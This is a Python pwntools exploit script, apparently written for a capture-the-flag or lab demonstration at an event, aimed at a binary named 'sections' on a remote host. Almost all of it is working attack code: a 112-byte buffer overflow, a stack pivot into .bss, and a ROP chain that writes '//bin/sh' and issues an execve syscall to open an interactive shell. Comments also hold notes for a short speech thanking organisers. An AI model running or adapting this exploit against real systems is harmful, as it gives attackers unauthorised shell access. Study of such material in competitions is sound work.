import time
from pwn import *

# only a couple minutes
# present the teams not much

# deirdre 
# mathias presents me
# 
# mention: polygl0ts, the people who made this possible
# mention: ICSchool, 
# mention: deirdre 
# mention: the dean, Rudiger
# mention: financially joke about the support 

# r = process("src/sections")

r = remote("95.216.35.42", 4700)
gdbscript = """
break *0x4002e3
c
"""
# r = gdb.debug("./src/sections", gdbscript=gdbscript)


str_loc = 0x004003b8





gadget_1 = str_loc + 96
gadget_2 = str_loc + 106
gadget_3 = str_loc + 250
gadget_4 = str_loc + 286
gadget_5 = str_loc + 379
gadget_6 = str_loc + 512
gadget_7 = str_loc + 537
syscall_gadget = 0x4001ff
main_gadget = 0x4002d0

print(r.recvline())
print(r.recvline())
print(r.recvline())
print(r.recvline())
print(r.recvline())

r.recvuntil(b"Go")


###
#AVAILABLE GADGETS:

#- write syscall gadget
#- read syscall gadget
#- pop rbp 
#- mov eax, dword ptr [rbp - 4]; pop rbp; ret;

# REQUIRED GADGETS:

# /bin/sh somewhere
# set rax to 0x3b
# pop rdi to set the pointer of /bin/sh
# set rsi to 0 
# set rdx to 0 


# SYSCALL THAT I GIVE YOU:
# the first:
    # use the normal write syscall
# the second:
    # pop r8; ret
    # mov rax, r8; ret
# the third:
    # pop rdi
# the fourth:
    # xor rsi, rsi; ret
# the fifth:
    # xor rdx, rdx; ret
### 

# gadget_1 = asm("pop rax; ret") + b"\x83"
# gadget_2 = asm("pop r8; ret") + b"\x83"
# gadget_3 = asm("mov rax, r8; ret") + b"\x83"
# gadget_4 = asm("pop rdi; ret") + b"\x83"
# gadget_5 = asm("xor rsi, rsi; ret") + b"\x83"
# gadget_6 = asm("xor rdx, rdx; ret") + b"\x83"
# gadget_7 = asm("pop rsp; ret") + b"\x83"

saved_rbp = p64(0x601008)

# write in .bss
chain = p64(gadget_1)
chain += p64(0x601000) 
chain += p64(main_gadget) 

# stack pivot!
chain += p64(gadget_7) 
chain += p64(0x601010) 

r.sendline(b"a"*112 + saved_rbp + chain)

time.sleep(0.5)


chain = b"//bin/sh"
chain += p64(0) 
chain += p64(gadget_5) # xor rsi, rsi
chain += p64(gadget_6) # xor rdx, rdx
chain += p64(gadget_1) # pop rax; ret
chain += p64(0x3b) 


chain += p64(gadget_4) # pop rdi; ret
chain += p64(0x601000) 

chain += p64(syscall_gadget) 

r.sendline(chain)
r.interactive()

# send the apks!
